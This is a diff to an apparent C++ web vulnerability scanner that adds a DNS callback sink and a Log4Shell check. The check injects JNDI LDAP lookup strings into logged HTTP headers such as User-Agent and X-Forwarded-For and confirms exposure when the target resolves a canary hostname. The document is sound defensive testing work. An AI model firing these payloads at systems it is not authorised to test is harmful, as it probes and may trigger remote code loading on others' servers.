@@ -7,6 +7,7 @@
 #include "h2_events.hpp"
 #include "oast_server.hpp"
 #include "oast_correlator.hpp"
+#include "dns_sink.hpp"
 #include "session_rules.hpp"
 #include "crawler.hpp"
 #include "update_check.hpp"
@@ -782,6 +783,11 @@ QByteArray ControlServer::buildSnapshot() const {
         if (m_wiring.oastCorrelator) {
             oast["registered"] = m_wiring.oastCorrelator->registeredCount();
             oast["confirmed"]  = m_wiring.oastCorrelator->confirmedCount();
+        }
+        if (m_wiring.dnsSink) {
+            oast["dnsRunning"] = m_wiring.dnsSink->running();
+            oast["dnsPort"]    = m_wiring.dnsSink->port();
+            oast["dnsHits"]    = m_wiring.dnsSink->hitCount();
         }
         root["oast"] = oast;
     }
@@ -2317,6 +2323,47 @@ QByteArray ControlServer::apiResponse(const QString &method, const QString &path
             s.request += "User-Agent: Nullock/oast-blast\r\n";
             s.request += "Accept: */*\r\nConnection: close\r\n\r\n";
             shots.append(s);
+        }
+
+        // Log4Shell: inject ${jndi:ldap://<token>.<dns-host>/a} into the
+        // headers most often logged (User-Agent, Referer, X-Api-Version,
+        // X-Forwarded-For). A vulnerable log4j evaluates the lookup, which
+        // first RESOLVES the hostname -- and that DNS query lands on our
+        // DNS sink even when LDAP egress is blocked. Only fired when the
+        // DNS sink is up (no DNS sink = no way to confirm it).
+        const bool wantLog4shell =
+            bodyJson.value("log4shell").toBool(m_wiring.dnsSink && m_wiring.dnsSink->running());
+        if (wantLog4shell && m_wiring.dnsSink && m_wiring.dnsSink->running()) {
+            const QString dnsHost = m_wiring.dnsSink->baseHost();
+            const int dnsPort = m_wiring.dnsSink->port();
+            static const char *kLog4Headers[] = {
+                "User-Agent", "Referer", "X-Api-Version",
+                "X-Forwarded-For", "X-Client-Ip",
+            };
+            for (const char *hname : kLog4Headers) {
+                const QJsonObject tok = registerShot("log4shell-oast",
+                    QString("header:%1").arg(QString::fromLatin1(hname)),
+                    QString::fromLatin1(hname));
+                const QString token = tok.value("token").toString();
+                // DNS-form canary: <token>.<dns-host>. The :port is for
+                // the LDAP leg; the resolver only needs the hostname.
+                const QString jndi =
+                    QString("${jndi:ldap://%1.%2:%3/a}").arg(token, dnsHost)
+                        .arg(dnsPort);
+                Shot s;
+                s.kind = "log4shell-oast";
+                s.note = QString("header:%1").arg(QString::fromLatin1(hname));
+                s.token = token;
+                s.cbUrl = QString("dns://%1.%2").arg(token, dnsHost);
+                s.request  = "GET " + basePath.toUtf8()
+                           + (existingQuery.isEmpty() ? QByteArray()
+                                                      : "?" + existingQuery.toUtf8())
+                           + " HTTP/1.1\r\n";
+                s.request += "Host: " + host.toUtf8() + "\r\n";
+                s.request += QByteArray(hname) + ": " + jndi.toUtf8() + "\r\n";
+                s.request += "Accept: */*\r\nConnection: close\r\n\r\n";
+                shots.append(s);
+            }
         }
 
         // Blind XXE: POST an XML body whose external entity resolves to
